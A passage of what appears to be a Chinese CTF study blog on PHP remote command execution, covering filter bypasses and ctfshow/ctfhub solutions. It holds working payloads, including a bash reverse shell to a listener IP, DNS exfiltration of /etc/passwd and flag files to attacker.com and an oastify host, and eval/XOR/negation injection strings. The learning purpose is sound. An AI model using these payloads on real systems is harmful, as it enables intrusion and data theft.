应用程序&amp;spm&#x3D;1001.2101.3001.7020)中的远程命令执行（RCE）漏洞\n2.出现漏洞的原因应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。\n\n未正确验证用户输入：应用程序未对用户提供的输入进行有效的验证或过滤，使得攻击者可以通过恶意输入注入命令。例如，没有过滤&amp;、&amp;&amp;、|、||等连接符\n\n将用户输入作为命令执行的一部分：应用程序在执行系统命令、数据库查询或其他操作时，未正确处理用户输入，导致攻击者能够通过注入恶意命令来执行任意操作。\n\n应用程序缺乏必要的安全控制机制，使得攻击者能够利用漏洞执行命令并获取系统权限\n\n\n我们来看下简单命令执行漏洞的源代码：\nif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;通过eval()函数 我们可以执行系统命令拿到flag\n\n\n\n1.命令拼接符我们一般需要使用命令拼接符才可以执行我们自己写上去的代码\n1.Windows\n\n\n拼接符\n示例\n详解\n\n\n\n&amp;\na&amp;b\n无论a是否正确b都会执行\n\n\n&amp;&amp;\na&amp;&amp;b\n当a正确b才会执行\n\n\n||\na||b\na执行失败然后才执行b\n\n\n|\na|b\n表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行\n\n\n2.Linux\n\n\n拼接符\n详解\n\n\n\n|\n表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行\n\n\n%0a\n应该是回车键的url编码，不知道为什么也可以用来拼接\n\n\n&amp;\n后台运行\n\n\n&amp;&amp;\n当a正确b才会执行\n\n\n||\na||b\n\n\n（）\n如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用 圆括号()把所有命令组合起来,示例如下\n\n\n;\n将多个命令用;分隔开可以运行多个命令\n\n\n2.危险函数\n\n\n函数\n返回值类型\n是否直接打印输出\n示例\n安全风险\n\n\n\nshell_exec()\nstring\n❌ 否\n$out = shell_exec(&#39;ls&#39;);\n高风险，需严格过滤输入\n\n\n**反引号 **\nstring\n❌ 否\n$out &#x3D; ls;\n同 shell_exec()\n\n\nexec()\n最后一行或数组\n❌ 否\nexec(&#39;ls&#39;, $output);\n需注意第二个参数（数组输出）\n\n\npassthru()\nvoid\n✅ 是\npassthru(&#39;ls&#39;);\n直接输出，高危\n\n\nsystem()\n最后一行\n✅ 是\nsystem(&#39;ls&#39;);\n直接输出，高危\n\n\nphp代码相关eval()assert()preg_replacecall_user_func()call_user_func_array()create_functionarray_map()系统命令执行相关system()passthru()exec()pcntl_exec()shell_exec()popen()proc_open()`(反单引号)ob_start()特殊函数phpinfo()#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息symlink()：#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容getenv#获取一个环境变量的值putenv($a)#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态\n\n危险函数太多了，全部记住基本不可能，全部写下来也很麻烦，看得多了就记住了。到时候php手册会帮我的\n\n\n\ncat\n显示整个文件内容\ncat file.txt\n快速查看小文件\n\n\n\nless\n分页交互式查看（可上下翻页）\nless file.txt\n查看大文件或日志\n\n\nmore\n分页查看（仅向下翻页）\nmore file.txt\n基础分页（兼容性高）\n\n\nhead\n显示文件开头部分（默认前 10 行）\nhead -n 20 file.txt\n查看文件头部内容\n\n\ntail\n显示文件末尾部分（默认后 10 行）\ntail -n 20 file.txt\n查看日志或文件尾部\n\n\ntac\n反向显示文件内容（从最后一行到第一行）\ntac file.txt\n逆向查看日志\n\n\nnl\n显示内容并添加行号\nnl file.txt\n需要行号时\n\n\ngrep\n过滤包含特定模式的行\ngrep &quot;error&quot; file.txt\n搜索关键词\n\n\nawk\n按列或条件提取内容\nawk &#39;&#123;print $1&#125;&#39; file.txt\n处理结构化文本（如 CSV）\n\n\nsed\n流编辑器，支持按行提取\nsed -n &#39;5,10p&#39; file.txt\n提取特定行或替换内容\n\n\ncut\n按列分割提取内容\ncut -d &#39;,&#39; -f 1 file.txt\n提取特定列（如分隔符文件）\n\n\nstrings\n提取二进制文件中的可打印字符串\nstrings /bin/ls\n分析二进制文件\n\n\nod\n以二进制&#x2F;十六进制格式查看\nod -c file.txt\n查看文件原始编码\n\n\nxxd\n生成十六进制转储\nxxd file.txt\n二进制文件分析\n\n\nrev\n反转每行字符顺序\nrev file.txt\n调试或特殊需求\n\n\nzcat\n直接查看压缩文件（.gz 格式）\nzcat file.gz\n无需解压查看压缩文件\n\n\nvim&#x2F;nano\n文本编辑器打开文件\nvim file.txt\n需要编辑时\n\n\n1.system()system — 执行外部程序，并且显示输出\nsystem(string $command, int &amp;$result_code = null): string|false\n\n同 C 版本的 system() 函数一样，本函数执行 command 参数所指定的命令，并且输出执行结果。\n如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。\n如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。\n参数\n$command\n要执行的命令。\n$result_code\n如果提供 result_code 参数，则外部命令执行后的返回状态将会被设置到此变量中。\n返回值\n成功则返回命令输出的最后一行，失败则返回 false\n2.passthru()passthru — 执行外部程序并且显示原始输出\n语法\npassthru(string $command, int &amp;$result_code = null): ?false\n\n同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。\n参数同system()\n返回值\n成功则返回命令输出的最后一行，失败则返回 false\n3.exec()exec — 执行一个外部程序\n语法\nexec(string $command, array &amp;$output = null, int &amp;$result_code = null): string|false\n\nexec() 执行 command 参数所指定的命令。\n参数\n$output如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \\n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。\n返回值\n命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。\n失败时返回 **false**。\n如果想要获取命令的输出内容， 请确保使用 output 参数。\n3.过滤绕过到了一个新的地方，各种关键字过滤肯定是要来了\n1.通配符常见的通配符\n\n\n\n符号\n含义\n\n\n\n？\n匹配单个字符如果匹配多个字符，就需要多个?连用\n\n\n*\n*代表任意数量的字符\n\n\n[ ]\n代表一定有一个在括号内的字符(非任意字符)。例如 [abcd] 代表一定有一个字符， 可能是 a, b, c, d 这四个任何一个\n\n\n一个常用的读取密码命令如下\ncat /etc/passwd\n\n使用了？通配符之后，他就可能有很多种变化，比如这两种，而这些亲测都是可以使用的\ncat /?tc/?as?wdcat /*tc/*as*wd\n\n这里需要注意的也是一样，不要局限自己的思维，几种通配符也是可以搭配使用的\nctf show 29,30都可以通过通配符绕过\n于是我们来看 31关，主要是这关用了根本没想到的骚操作\n源代码：\nerror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n我们首先通过通配符绕过\nc=passthru(&quot;tac\\$&#123;IFS&#125;?lag?ph?&quot;);//我们使用了$&#123;IFS&#125;代替空格，要注意的是在url中$属于特殊字符，需要在进行转义//然后就是用?匹配字符命令执行\n\n我们也可以跳板：\nc=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);//url中通过&amp;来分隔两个GET传参 我们把c中写入未过滤的代码 1中\n\n2.关键符过滤ctf show 32关中过滤掉了绝大部分符号\n源代码：\nerror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;//注意正则表达式换行的时候把空格盖住了，空gei\n\n过滤掉了括号和反引号，目前我就没办法使用系统命令执行，于是看了题解\n之前我们使用include都是include($file)，于是我们重新了解一下\ninclude语法：\ninclude&#x27;$file&#x27;; 和 include($file); 都是可以执行的//于是记录一下不需要使用括号的函数//echo print isset unset include require题解中 include%0a$_GET[1]也可以 //%0a是回车键的url编码 估计是有什么神秘力量，include后面加空格怎么说都不行，估计是绕不过验证//为什么空格用%20也绕不过验证\n\n于是根据include特性，只需传入：\ninclude&quot;$_GET[1]&quot;&amp;1=php://filter/convert.base64-encode/resource=flag.php\n\n3.综合过滤练习我好像没写过多条命令一起执行的题目，于是他就来了\nctf hub 综合过滤练习\n源代码：\nif (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;    $ip = $_GET[&#x27;ip&#x27;];    $m = [];    if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|ctfhub)/&quot;, $ip, $m)) &#123;        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;        exec($cmd, $res);    &#125; else &#123;        $res = $m;    &#125;&#125;\n\n和以前不同的是准备好了命令执行函数 ，和需要多条命令执行，命令拼接符终于用到了，但知道的全部给谁过滤掉了\n//拼接符被过滤掉了，我们还剩%0a可以作为拼接符//空格使用$&#123;IFS&#125;替代//cat他函数即可//关键词用通配符\n\n直接上答案：\nip=127.0.0.1%0als//查看当前目录 发现在文件夹flag_is_here中ip=127.0.0.1%0acd$&#123;IFS&#125;fla?_is_here%0als//查看文件夹 目录//有点奇怪 之前好像有这么一个说法 $属于url特殊字符 需要转义不然没用，但为什么这个题目用了转义还错了ip=127.0.0.1%0acd$&#123;IFS&#125;fla?_is_here%0atac$&#123;IFS&#125;flag_168933341887.php\n\n4.空格绕过虽然内容挺少的，但还是要记一下\nlinux内置分隔符：$&#123;IFS&#125;，$IFS，$IFS$9 可作为空格代替//不知道为什么$IFS有时用不起利用重定向符&lt;&gt;//我们有时候也可以使用其他符号代替空格//比如我们有时使用回车和tab也可以达到效果我们通过url编码即可//回车：%0a tab:%09\n\n5.关键词绕过通过拆分命令达到绕过的效果：a=l;b=s;$a$b//话说为什么不需要$a=l//问了一下ai好像有点思路AI:在 Linux 的 shell （如 Bash）中，这是一个变量赋值语句。它将字符 l 赋值给变量 a。在 shell 里，变量赋值时等号两边不能有空格，格式为 变量名=值。空变量绕过：cat fl$&#123;x&#125;ag cat tes$(z)t/flag控制环境变量绕过：先利用echo $PATH得到环境变量 =&gt; &quot;/usr/local/….blablabla”接着利用echo $&#123;#PATH&#125;得到长度然后要哪个字符截取哪个字符就行$&#123;PATH:0:1&#125; =&gt; ‘/’$&#123;PATH:1:1&#125; =&gt; ‘u’$&#123;PATH:0:4&#125; =&gt; ‘/usr’空值绕过：cat fl&quot;&quot;ag cat fl&#x27;&#x27;ag cat &quot;fl&quot;&quot;ag&quot;//经过测试 确实有用反斜杠绕过：ca\\t flag l\\s//也挺好用的\n\n6.空变量之前提到了空变量，但不怎么懂\n$*和$@，$x(x 代表 1-9)，$&#123;x&#125;(x&gt;=10)：比如ca$&#123;21&#125;t a.txt表示cat a.txt在没有传入参数的情况下，这些特殊字符默认为空，如下:wh$1oamiwho$@amiwhoa$*mi\n\n7.目录跨越当我们的路径符/被过滤掉了的时候，我们还有一招就是通过cd命令进行目录穿越\ncd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;ls\n\n这里面的&amp;&amp;是用来分隔命令的\n4.无参RCE我们先来看ctfshow40关：\nif(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125; \n\n//上面代码能过滤的基本都过滤了，但我们仔细看就会发现过滤的括号是中文括号（ )我们仍然可以使用英文括号//也就是说，我们需要只使用字母和括号完成命令执行\n\n看了网上的教程，这道题需要使用无参RCE来解\n首先我们需要认识几个函数\n1.函数1.localeconv()localeconv() 函数返回一包含本地数字及货币格式信息的数组。\n\n\n乍一看这个函数跟文件读取也没关系啊，但就是这个占不到边的函数也能玩出新花样。它返回的是一个数组，数组的第一行是一个点（.） 这个点就可以代表当前目录了，我们可以用current()函数取出这个点。取出这个点之后，再用scandir函数进行目录遍历。\n具体传参：var_dump(scandir(current(localeconv())));就可以遍历当前目录所有文件。\n2.current()它还有别名pos()，其实都是一样的。\n输出数组当前元素的值，每一个数组中都有一个内部的指针，指向他当前的元素。初始指向当前数组中的第一个元素。这个函数不会移动指针，但是有next()函数和prev函数可以移动指针。\n\n\n3.scandir()列出当前目录的文件和目录，以数组的形式展现出来。\n语法：\n\n\n4.chdir()chdir() 函数改变当前的目录。这个函数是是用来跳目录的，有时我们要读取的文件不在当前目录下，所以我们要改变当前目录。比如用chdir(‘..’)来跳回上一级目录。再配合scandir函数遍历任意目录下的文件。\n5.array_ reverse()根据单词意思就知道这个函数的功能就是将数组倒过来。\n6.highlight_file()这个函数用来高亮代码，可以相当于文件读取。相当于show_source()。\n7.getcwd()这个函数返回当前工作目录。成功则返回当前工作目录，失败则返回FALSE。也需要用scandir函数遍历当前工作目录。\n8.dirname()这个函数返回路径中的目录名称部分。\n\n\n9.get_defined_vars()返回由所有已定义变量所组成的数组。\n返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。\n10.getallheaders()这个函数就是返回一个数组，数组中包含我们Http请求头中的各个字段的值，这个和我们之前的注入方式不一样\n我们如果没有文件读取函数，就需要命令执行来读取文件，我们就需要在被过滤的情况下通过函数获取到命令执行的输入，getallheaders可以通过请求头来获取命令输入\n\n\n然后就是我们添加的一些字段是没有办法直接排在数组的头或者尾的，那个时候可以尝试改写其他字段，或者直接删除，具体情况不同\n\n\n直接尝试删除后面部分字段也是可以成功解析的\n\n\n我对Http协议一点都不懂，只能说这个有时候不同题目有点玄学\n11.array_flip()这个函数用于交换一个数组的键和值，可以配合array_rand进行使用\n12.array_rand()从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。\n返回值\n如果只取出一个，array_rand()    返回随机单元的键名。   否则就返回包含随机键名的数组。   完成后，就可以根据随机的键获取数组的随机值。   取出数量如果超过 array 的长度，就会导致 E_WARNING 错误，并返回 NULL。 \n也就是可以随机返回一个键名，我们可以在一些情况下进行暴力获取我们的输入\n\n\n先通过array_flip将键值对翻转，然后再通过array_rand随机获取键值，可以在next，end，current被过滤的情况下无视我们输入在数组中的位置，爆破出flag即可\n\n\n\n\n实战我们需要使用上面提到的函数实现命令执行，由于有各种方法，只能单开一栏了\n//首先还是ctfshow40，主要核心就是通过localeconv()绕过.的过滤，和current()取出.字符，实现路径，然后scandir()访问目录下文件//剩下的就是使用各种方法读取文件了\n\n我们可以var_dump(scandir(current(localeconv())));//来查看目录中文件，得到array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(8) &quot;flag.php&quot; [3]=&gt; string(9) &quot;index.php&quot; &#125;//我们需要打开flag.php,可以先翻转数组然后再使用next()改变指针，最后使用highlight_file()回显文件内容highlight_file(next(array_reverse(scandir(current(localeconv())))));\n\n5.异或拼接字符到了ctfshow41关，难度又上了\nif(isset($_POST[&#x27;c&#x27;]))&#123;    $c = $_POST[&#x27;c&#x27;];if(!preg_match(&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;, $c))&#123;        eval(&quot;echo($c);&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; \n\n这次连小写字母和数字都过滤掉了，很明显正常写法根本不可能行动通，我肯定只能看下题解了\n经过长时间的阅读，我大概理解了绕过原理了，就是通过url编码将两个未被过滤掉的字符进行异或运算，运算结果为我们需要的字符\n比如：A %40 %01A=%40|%01我们先对两个字符进行解码得到@ \u0001(复制有点不同，总之是一个很生僻的字符)也就是说我们进行运算的两个字符解码后不会被过滤url编码%后面的数字是16进制，进行运算我们需要先将其转换为2进制1000000|0000001=1000001=65(十进制)然后A的ascii码值就是65\n\n我们来看一下实例：\n[+] your function：system[+] your command：ls(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);//再深入一点的话我就无法理解了，原理就是那样//以后我可能会很轻松理解，但现在极限了，而且这是一个脚本实现的题目\n\n这里留下一个问题 关键是，我不会用也没有他们说的脚本\n6.取反绕过二进制表示形式有原码，反码。补码。php中有取反符~可以对字符进行取反\n当我们被过滤掉字母和数字的时候，我们除了异或拼接，我们也可以通过取反符进行绕过\nurl编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。\n即我们传入的是经过取反的url编码，正则匹配时进行解码后全是不可打印字符，我们再在前面加上取反符，当命令执行时会解析取反符，就会变成正常命令执行\n实例代码：\n&lt;?php error_reporting(0);$a=&#x27;assert&#x27;;$b=urlencode(~$a);echo $b;echo &quot;&lt;br&gt;&quot;;$c=&#x27;(eval($_POST[test]))&#x27;;$d=urlencode(~$c);echo $d; ?&gt;\n\npayload；\n?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);\n\n通过取反进行代码执行的时候我们执行函数必须以\n(~%8F%97%8F%96%91%99%90)();\n\n后面需要跟括号才能让取反结果不是字符串而是函数\n我在进行取反然后函数执行的时候比如执行phpinfo()\n\n\nphp会给出警告，然后原因是在进行取反之前eval检测代码中出现未定义的函数，也就是说在进行取反之前会进行检测，然后到了php8中也是经典的警告变报错，也就是通过eval执行代码在php8中不可使用\nUndefined constant &quot;�������&quot; in D:\\Mei的编程\\CTF\\草稿2.php(19) : eval()&#x27;d code:1 Stack trace: #0 D:\\Mei的编程\\CTF\\草稿2.php(19): eval() #1 &#123;main&#125; thrown in D:\\Mei的编程\\CTF\\草稿2.php(19) : eval()&#x27;d code on line 1 \n\n\n\n7. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1因为不知道这是什么意思，只能复制下来\n我们先来看源代码：\nif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\n可见，这是一个没有任何过滤的命令执行，但后面加了个奇怪的语句，实在搞不懂，自己理解的话就是把前面代码执行的输出放到&#x2F;dev&#x2F;null文件当中从而实现消失回显\n至于解题的话，只需要使用命令拼接符把两条命令分开，使后面的命令没回显即可\ntac flag.php||ls;\n\n\n\n8.无回显RCE报应来了，之前他们在说反弹shell和dnslog外带的时候不知道是什么东西，原来是用来解无回显RCE的\n1.反弹shell我们只学了php，所以只看php反弹shell和bash命令\n首先最简单的一个办法，就是使用php的exec函数执行反弹shell\n攻击者：nc -nvlp 9875受害者：php -r &#x27;exec(&quot;/usr/bin/bash -i &gt;&amp; /dev/tcp/192.168.239.128/9875 0&gt;&amp;1&quot;);&#x27;\n\n现在我们来了解下这个bash命令的原理\n命令释义\n攻击者监听端口\nnc -lvp 9999\n\nnc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口-l 监听模式，用于入站连接-v 详细输出–用两个-v可得到更详细的内容-p port 本地端口号\n受害者将输入和输出重定向到攻击者主机\nbash -i &gt;&amp; /dev/tcp/192.168.239.128/9999 0&gt;&amp;1\n\nbash -i代表在本地打开一个bash\n&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps\n&#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接\n远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出\ninux文件描述符：linux shell下有三种标准的文件描述符，分别如下：0 - stdin 代表标准输入,使用&lt;或&lt;&lt;1 - stdout 代表标准输出,使用&gt;或&gt;&gt;2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;\n意思就是通过两次输出重定向至文件，分别实现输出和输入的重定向。\n第一次把输出重定向至我们的攻击服务器，第二次把输入重定向至输出，也就相当于重定向至攻击者\n2.重定向符当我们没有回显的时候也可以选择使用重定向符将回显写入指定文件然后下载读取即可\n\n**&gt;**：覆盖输出到文件。\n**&gt;&gt;**：追加输出到文件。\n**&lt;**：从文件读取输入。\n**2&gt;**：重定向标准错误。\n**&amp;&gt;**：重定向标准输出和标准错误。\n**|**：将一个命令的输出传递给另一个命令。\n\n1.输出重定向\n**&gt;**：将命令的输出重定向到文件，覆盖文件内容。\necho &quot;Hello, World!&quot; &gt; output.txt\n\n如果output.txt不存在，则创建；若存在，内容将被覆盖。\n**&gt;&gt;**：将命令的输出追加到文件末尾。\necho &quot;Hello again!&quot; &gt;&gt; output.txt\n\n如果文件不存在，则创建；若存在，内容将追加到文件末尾。\n2.输入重定向\n**&lt;**：将文件内容作为命令的输入。\nwc -l &lt; input.txt\n\n统计input.txt的行数。\n3.错误重定向\n**2&gt;**：将标准错误重定向到文件，覆盖文件内容。\nls non_existent_file 2&gt; error.log\n\n\n如果文件不存在，错误信息将写入error.log，覆盖原有内容。\n**2&gt;&gt;**：将标准错误追加到文件末尾。\n\n4. 同时重定向标准输出和标准错误\n**&amp;&gt;**：将标准输出和标准错误都重定向到文件，覆盖文件内容。\nls non_existent_file &amp;&gt; output.log\n\n\n输出和错误信息都将写入output.log，覆盖原有内容。\n**&amp;&gt;&gt;**：将标准输出和标准错误都追加到文件末尾。\n\n3.dnslog外带dns是域名解析，dnslog则是域名解析日志，会储存着所有解析过的域名，我们利用这个特性可以拿到一些无回显的信息\n原理就是域名解析是从右到左，我们可以通过在域名左边带上一些无回显信息去进行dns解析，系统在遇到dnslog的域名时会认为这是一个普通域名而让其去访问\n系统执行命令的时候会让查询结果和dns域名一起去访问dnslog网站，通过解析会在dnslong中储存着，我们因此能够拿到查询结果\n但是我能拿到的dnslog网站我基本上都失败了，还有真的会有网站设置可以让你外带吗，但是还是要试下\nping命令\nping 是 Linux 中最常用的网络诊断工具之一，用于测试主机之间的网络连通性。它通过发送 ICMP (Internet Control Message Protocol) 回显请求包到目标主机，并等待 ICMP 回显应答。\nping [选项] 目标主机\n\n\n\n\n选项\n描述\n\n\n\n-c &lt;次数&gt;\n指定发送的 ping 请求次数\n\n\n-i &lt;秒数&gt;\n设置 ping 包发送间隔时间\n\n\n-s &lt;大小&gt;\n设置发送的 ping 包大小（字节）\n\n\n-t &lt;TTL&gt;\n设置数据包的生存时间 (Time To Live)\n\n\n-w &lt;秒数&gt;\n设置超时时间（秒）\n\n\n-q\n安静模式，只显示摘要信息\n\n\n-v\n详细输出\n\n\n-4\n强制使用 IPv4\n\n\n-6\n强制使用 IPv6\n\n\n-f\n洪水 ping (快速连续发送，仅限 root 用户)\n\n\n一些使用语句\nping example.comping -c 5 example.com #指定请求次数ping -s 1000 example.com  # 发送 1000 字节的包ping -i 2 example.com  # 每 2 秒 ping 一次\n\n我们再收集一些payload\nping -c 1 $(id | base64 | tr -d &#x27;\\n&#x27;).attacker.com# Base64编码后传输（避免域名非法字符）ping $(echo &quot;result&quot; | base64 | tr -d &#x27;=&#x27; | tr -d &#x27;\\n&#x27;).attacker.com# 示例：外带/etc/passwd的前20字符ping $(head -c 20 /etc/passwd | base64 | tr -d &#x27;\\n&#x27;).attacker.comping $(cat /flag | base64 | tr -d &#x27;\\n=&#x27;).4lqd0ugbqz0z5cabk74tycp6mxsogn4c.oastify.com\n\n\n\n\n\n9.PCRE回溯次数限制绕过(正则溢出)这个我之前在写题目的时候遇到过这种解法，但是当时只知道在前面加100万个不匹配字符就可以绕过正则匹配，但是不知道这里面的原理\n我们现在来看一下\n&lt;?phpfunction is_php($data)&#123;      return preg_match(&#x27;/&lt;\\?.*[(`;?&gt;].*/is&#x27;, $data);  &#125;if(!is_php($input)) &#123;    // fwrite($f, $input); ...&#125;\n\n正则表达式是一个可以被“有限状态自动机”接受的语言类。\n“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。\n而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：\n\nDFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入\nNFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态\n\n由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。\nphp使用的是NFA进行正则匹配，但是介绍有点不明白，我的理解就是正则表达式和字符串同时进行匹配，如果中途出现匹配不上的情况则开始回溯，回溯的目的就是尝试其他匹配方式\n这里搬下大佬的图\n\n\n我们可以看见第四次匹配的时候已经全部匹配到了，但是由于后面带有一个[(&#96;;?&gt;].*需要匹配中括号中字符，无法匹配便开始回溯，回溯到13次的时候匹配到;，则继续向后面匹配直到字符串全部匹配，由于每次回溯一个字符所以回溯次数由字符数决定\n这也就是为什么需要100万个无关字符，目的是让回溯次数达到100万\n回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万\npreg_match函数返回false表示此次执行失败了，我们可以调用var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);，发现失败的原因的确是回溯次数超出了限制：\n于是我们的字符串就可以通过回溯次数超过限制返回false来绕过正则匹配\n10.做题经验和payload到最后还是要收集payload，和各种绕过姿势\n除了上面提到的各种绕过方法这里就只剩下做题经验了\n1.session命令执行使用session进行命令执行是我没想到的，原理和跳板差不多，只不过可以不用POST和GET就能跳板\nurldecode(session_id(session_start()));\n\n通过session_start()启动会话，然后使用session_id()获取当前的会话id，最后eval进行命令执行\n由于session_id中不能出现引号，因此通过两次url编码来解决\nPHPSESSID=highlight_file(%2522flag.php%2522)%3B\n\n\n\n2.create_function()这个函数在某些方面可以进行命令执行，需要$没有被过滤，而且对php版本有要求\nshell=echo create_function(&#x27;&#x27;,$_POST[&#x27;cmd&#x27;])();&amp;cmd=system(&#x27;cat /tgfffffllllaagggggg&#x27;);\n\n但是上面这个也是有点极端的，应该是外面套了一层eval然后通过echo调用这个函数进行输出，条件还是有点苛刻，更多时候使用到的还是代码注入，闭合了就不需要触发函数才能输出了\n我们需要知道creat_function会将第二个参数作为代码放入函数中实际上结果就是\nfunction functions&#123;    $_POST[&#x27;cmd&#x27;];&#125;\n\n然后再执行当前函数，所以我们可以通过闭合进行代码执行\nb=;&#125;system(&#x27;ls /&#x27;);/*\n\n效果如下\nfunction functions&#123;    ;&#125;system(&#x27;ls /&#x27;);/*&#125;\n\n我们这样可行的原因就是create_function会对其匿名函数使用一次eval，外面的system自然会被执行\n"},{"title":"php特性","url":"/2025/02/09/php%E7%89%B9%E6%80%A7/","content":"PHP特性笔记前言受不了了，其他漏洞看题解和天书一样，要不就要写各种脚本，要不就各种看不懂的操作和各种神秘函数，看来我php根本不够格，这是为ctfshow，php特性专门开的笔记\n89关源代码：\ninclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;\n\n\n\n1.intval()函数intval — 获取变量的整数值\n语法：\nintval(mixed $value, int $base = 10): int//通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。\n\n参数：\nvalue    要转换成 integer 的数量值base    转化所使用的进制\n\n注意:\n如果 base 是 0，通过检测 value 的格式来决定使用的进制：\n\n如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，\n如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，\n如果字符串以 “0” 开始，使用 8 进制(octal)；否则，\n将使用 10 进制 (decimal)。\n\n返回值\n成功时返回 value 的 integer 值，失败时返回 0。 空的 array 返回 1，非空的 array 返回 1。intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。\n最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上，intval(&#39;1000000000000&#39;) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 